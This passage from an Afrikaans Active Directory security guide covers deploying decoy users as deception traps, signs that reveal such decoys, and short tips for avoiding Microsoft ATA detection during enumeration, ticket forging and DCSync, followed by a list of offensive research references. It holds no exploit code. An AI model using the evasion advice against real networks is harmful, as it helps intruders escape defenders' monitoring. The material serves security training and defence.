- Bevorder detections van enrichment -> hunting -> alerting soos wat jy vertroue in die baseline opbou

### **Implementing Deception Techniques**

- Die implementering van deception behels die opstel van traps, soos decoy users of computers, met features soos passwords wat nie expire nie of as Trusted for Delegation gemerk is. ’n Gedetailleerde benadering sluit in om users met spesifieke regte te skep of hulle by high privilege groups te voeg.<sup>[[2]](#references)</sup>
- ’n Praktiese voorbeeld behels die gebruik van tools soos: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Meer oor die deployment van deception techniques kan gevind word by [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **Vir User Objects**: Suspicious indicators sluit in atypiese ObjectSID, ongereelde logons, creation dates, en lae bad password counts.
- **General Indicators**: Die vergelyking van attributes van potensiële decoy objects met dié van egte objects kan inconsistencies blootlê. Tools soos [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) kan help om sulke deceptions te identifiseer.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Vermy session enumeration op Domain Controllers om ATA-detection te voorkom.
- **Ticket Impersonation**: Die gebruik van **aes** keys vir ticket creation help om detection te ontduik deur nie na NTLM te downgrade nie.
- **DCSync Attacks**: Dit word aanbeveel om dit vanaf ’n nie-Domain Controller uit te voer om ATA-detection te vermy, aangesien direkte uitvoering vanaf ’n Domain Controller alerts sal trigger.

## References

- [1] [’n Gids tot die aanval van Domain Trusts](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Trusts vervals vir deception in Active Directory](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Van Domain Admin na Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP BOF Collection – In-Memory LDAP Toolkit vir Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Impacket ontleed](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: Neem Active Directory Accounts oor via Netlogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - Hoe om die changes in Netlogon secure channel connections wat met CVE-2020-1472 geassosieer word, te bestuur](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [’n Reis na vergete Null Session- en MS-RPC-interfaces](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [SID filter as security boundary between domains? (Part 4) - Bypass SID filtering research](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [SID filter as security boundary between domains? (Part 5) - Golden GMSA trust attack - from child to parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [SID filter as security boundary between domains? (Part 6) - Schema change trust attack - from child to parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [Van DA na EA met ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [Eskaleer van child domain se admins na enterprise admins in 5 minute deur AD CS te misbruik, ’n opvolg](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [An ACE Up the Sleeve: Designing Active Directory DACL Backdoors](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
{{#include ../../banners/hacktricks-training.md}}
